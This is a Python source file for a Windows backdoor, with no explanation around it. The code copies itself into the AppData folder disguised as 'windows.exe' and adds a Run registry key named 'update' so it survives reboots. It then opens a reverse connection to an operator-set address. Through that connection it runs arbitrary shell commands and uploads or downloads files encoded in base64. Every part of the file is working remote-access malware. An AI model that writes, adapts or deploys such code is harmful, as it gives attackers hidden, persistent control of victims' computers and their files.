import socket
import subprocess
import simplejson
import os
import base64
import sys
import shutil


class Backdoor:
    def __init__(self, ip, port):
        self.change_file_location()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def change_file_location(self):
        location = os.environ(["appdata"]) + "\\windows.exe"
        if not os.path.exists(location):
            shutil.copy(sys.executable, location)
            subprocess.call(
                "reg add HKCU\software\microsoft\windows\currentversion\run /v update /t REG_SZ /d ""+ location + """,
                shell=True)

    def json_sent(self, data):
        json_data = simplejson.dumps(data)
        self.connection.send(json_data.encode("utf-8"))

    def json_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode("utf-8")
                return simplejson.loads(json_data)
            except ValueError:
                continue

    def change_directory(self, path):
        os.chdir(path)

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] upload successfully"

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def execute_system_command(self, command):
        DEVNULL = open(os.devnull, "wb")
        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)

    def run(self):
        while True:
            command = self.json_receive()
            try:
                if command == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    self.change_directory(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command)
            except Exception:
                command_result = "[-] Error"
            self.json_sent(command_result)


ip = "127.0.0.1" #Enter Ip address
port = "1234" #port
try:
    backdoor = Backdoor(ip, int(port))
    backdoor.run()
except:
    sys.exit()
